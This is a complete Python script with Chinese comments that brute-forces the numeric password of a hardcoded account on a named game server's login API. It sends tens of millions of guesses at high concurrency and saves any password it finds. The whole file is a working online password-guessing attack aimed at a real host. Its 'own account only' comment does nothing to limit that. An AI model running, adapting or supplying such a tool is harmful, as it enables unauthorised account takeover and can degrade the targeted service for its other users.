#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
高速枚举 - 仅限本人账号使用
依赖: pip install aiohttp
可选加速: pip install uvloop（Termux/Android 上装不上也没关系）
"""

import asyncio
import os
import sys
import time

# uvloop 提速（可选）
try:
    import uvloop
    uvloop.install()
    print("[+] uvloop 已启用")
except ImportError:
    pass

import aiohttp


# ============ 配置 ============
URL = "http://game12.firetheword.cn/game/login/login"
USER_NAME = "E3DA903412"

# 从 HAR 请求头里把 auth 完整粘贴过来（不要换行）
AUTH = "把HAR里的auth字段完整粘贴到这里"

# 并发，按服务端承受能力调；环境变量 CONC 也可覆盖
CONCURRENCY = int(os.environ.get("CONC", "200"))

TIMEOUT = aiohttp.ClientTimeout(total=5, connect=3, sock_read=4)

HEADERS = {
    "site": "game",
    "areaid": "49",
    "os": "android",
    "Accept": "*/*",
    "ticket": "",
  #  "auth": AUTH,
    "api_version": "1",
    "version": "133",
    "userId": "2",
    "Content-Type": "application/json; charset=UTF-8",
    "User-Agent": "okhttp/3.9.1",
}

# 预拼接 body 前后缀，省掉 json.dumps 的开销
PAYLOAD_PREFIX = '{"password":"'
PAYLOAD_SUFFIX = f'","user_name":"{USER_NAME}","force_login":"true"}}'

# 命中标记：成功响应里 ticket 形如 TGT-xxxx.apestar.com
SUCCESS_MARK = b'"ticket":"TGT-'


def make_payload(pwd: str) -> bytes:
    return (PAYLOAD_PREFIX + pwd + PAYLOAD_SUFFIX).encode("ascii")


# ============ Worker ============
async def worker(session, queue, stop_event, stats):
    while True:
        if stop_event.is_set():
            return

        try:
            pwd = await asyncio.wait_for(queue.get(), timeout=1.0)
        except asyncio.TimeoutError:
            continue

        if pwd is None:
            return

        try:
            async with session.post(URL, data=make_payload(pwd)) as r:
                body = await r.read()
                if SUCCESS_MARK in body:
                    with open("found_password.txt", "w", encoding="utf-8") as f:
                        f.write(pwd)
                    print(f"\n[!!!] 命中: password = {pwd}")
                    stop_event.set()
                    return
        except Exception:
            pass  # 超时/断连直接忽略，绝不停下

        stats[0] += 1


# ============ 生产者 ============
async def producer(queue, start, end, stop_event, concurrency):
    i = start
    while i < end and not stop_event.is_set():
        try:
            queue.put_nowait(str(i))
            i += 1
        except asyncio.QueueFull:
            await asyncio.sleep(0.0002)

    # 毒丸（正常结束时才发）
    sent = 0
    while sent < concurrency and not stop_event.is_set():
        try:
            queue.put_nowait(None)
            sent += 1
        except asyncio.QueueFull:
            await asyncio.sleep(0.001)


# ============ 进度 ============
async def reporter(stats, stop_event, start_ts, total):
    last_t = start_ts
    last_n = 0
    while not stop_event.is_set():
        await asyncio.sleep(5)
        cur = stats[0]
        now = time.time()
        elapsed = now - start_ts
        inst_rate = (cur - last_n) / (now - last_t) if now > last_t else 0
        last_t, last_n = now, cur
        avg_rate = cur / elapsed if elapsed > 0 else 0
        left = (total - cur) / avg_rate if avg_rate > 0 else 0
        print(f"[进度] {cur}/{total}  {cur/total*100:.2f}%  "
              f"瞬时 {inst_rate:.0f}/s  平均 {avg_rate:.0f}/s  "
              f"已用 {elapsed:.0f}s  预计剩余 {left/3600:.2f}h")

        # 全部跑完，自动退出
        if cur >= total:
            print(f"[*] 区间跑完，未命中")
            return


# ============ 主流程 ============
async def run(start, end, concurrency):
    queue = asyncio.Queue(maxsize=concurrency * 32)
    stop_event = asyncio.Event()
    stats = [0]
    start_ts = time.time()

    connector = aiohttp.TCPConnector(
        limit=concurrency,
        limit_per_host=concurrency,
        ttl_dns_cache=300,
        keepalive_timeout=30,
        enable_cleanup_closed=True,
    )

    async with aiohttp.ClientSession(
        connector=connector,
        headers=HEADERS,
        timeout=TIMEOUT,
        auto_decompress=True,
    ) as session:
        workers = [
            asyncio.create_task(worker(session, queue, stop_event, stats))
            for _ in range(concurrency)
        ]
        prod = asyncio.create_task(
            producer(queue, start, end, stop_event, concurrency)
        )
        rep = asyncio.create_task(
            reporter(stats, stop_event, start_ts, end - start)
        )

        # 先等所有 worker 和 producer 结束
        await asyncio.gather(*workers, prod, return_exceptions=True)

        # 再通知 reporter 退出
        stop_event.set()
        await asyncio.gather(rep, return_exceptions=True)

        print(f"\n[*] 结束，共尝试 {stats[0]} 条")


def main():
    start = int(sys.argv[1]) if len(sys.argv) > 1 else 10_000_000
    end = int(sys.argv[2]) if len(sys.argv) > 2 else 100_000_000

    print(f"[*] 范围: {start} ~ {end - 1}")
    print(f"[*] 并发: {CONCURRENCY}")
    print(f"[*] 账号: {USER_NAME}")
    print(f"[*] 目标: {URL}")

    try:
        asyncio.run(run(start, end, CONCURRENCY))
    except KeyboardInterrupt:
        print("\n[!] 手动中断")


if __name__ == "__main__":
    main()